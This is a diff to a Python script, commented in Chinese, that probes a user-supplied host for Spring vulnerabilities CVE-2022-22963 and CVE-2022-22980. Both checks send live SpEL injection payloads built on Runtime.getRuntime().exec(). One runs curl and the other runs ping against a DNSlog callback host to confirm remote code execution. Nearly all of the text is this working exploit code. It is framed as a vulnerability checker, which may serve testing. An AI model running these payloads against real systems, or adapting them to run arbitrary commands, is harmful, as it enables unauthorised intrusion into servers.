@@ -9,6 +9,8 @@ import sys
 import urllib3
 import threading
 import base64
+from time import sleep
+import time
 init(autoreset=True)
 dnslog=input("请输入dnslog.py运行后获得的结果：")
 url=input("输入想要测试的域名或IP：")
@@ -48,7 +50,7 @@ print("########################################################")
 
 #cve-2022-22963
 command='curl '+dnslog
-payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'##构造payload，直接执行52行的command
+payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'##构造payload，直接执行command
 headers2 = {
     'spring.cloud.function.routing-expression': payload,
     'Accept-Encoding': 'gzip, deflate',
@@ -138,6 +140,23 @@ else:
     print('#'"[-]" + url + '目标不存在CVE-2017-8046漏洞')
     print("########################################################")
 
+##cve_2022_22980
+print('')
+print(colorama.Fore.CYAN+'cve-2022-22980正在验证中，请稍等')
+cve_2022_22980_path='demo'
+cve_2022_22980_data='keyword=T(java.lang.Runtime).getRuntime().exec("ping '+dnslog+'")'
+cve_2022_22980_headers={
+    'Content-Type':'application/x-www-form-urlencoded',
+    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
+}
+cve_2022_22980_r=requests.post(url=url+cve_2022_22980_path,headers=cve_2022_22980_headers,data=cve_2022_22980_data)
+
+if cve_2022_22980_r.status_code==500:
+    print(colorama.Fore.CYAN + "[+]" + url + '可能存在CVE-2022-22980，返回终端看有无Dnslog请求')
+    print("########################################################")
+else:
+    print('#'"[-]" + url + '目标不存在CVE-2022-22980漏洞')
+    print("########################################################")
 
 
 
